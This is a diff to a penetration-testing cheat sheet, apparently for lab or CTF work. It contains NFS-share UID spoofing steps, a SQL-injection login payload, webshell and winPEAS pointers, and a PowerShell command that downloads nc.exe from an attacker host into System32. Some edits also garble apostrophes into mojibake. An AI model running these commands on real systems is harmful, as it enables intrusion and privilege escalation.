@@ -30,7 +30,7 @@ nmap -p 111 --script nfs* $RHOST
 ============================================================================================================
 If you find NFS shares, mount them and see if you can read/write files 
 or change your permissions by adding a new user with a certain UID. 
-If you can’t seem to do anything, remember the fact that it is there for later.
+If you canâ€™t seem to do anything, remember the fact that it is there for later.
 
 mount -t nfs -o vers=3 $RHOST:/SHARENAME /mnt
 groupadd --gid 1337 pwn
@@ -77,8 +77,8 @@ admin:' OR '1'='1
 
 
 ===============for web shell====================================================
-In these instances, it’s a valuable skill to be able to effectively 
-identify the web technology and have a webshell at hand that you can try (try Kali’s /usr/share/webshells
+In these instances, itâ€™s a valuable skill to be able to effectively 
+identify the web technology and have a webshell at hand that you can try (try Kaliâ€™s /usr/share/webshells
 =============================================================================
 
 
@@ -89,7 +89,6 @@ uname -an
 lsb_release -n
 tree /f /a
 =================
-
 winPEAS.exe
 
 
@@ -101,6 +100,11 @@ https://github.com/s0wr0b1ndef/
 =================================================
 
 
+
+Windows transfer file to other system
+==================================================================================================
+iwr -uri http://10.10.14.120:8080/nc.exe -o 'C:\Windows\System32\nc.exe'
+==================================================================================================
 
 
 
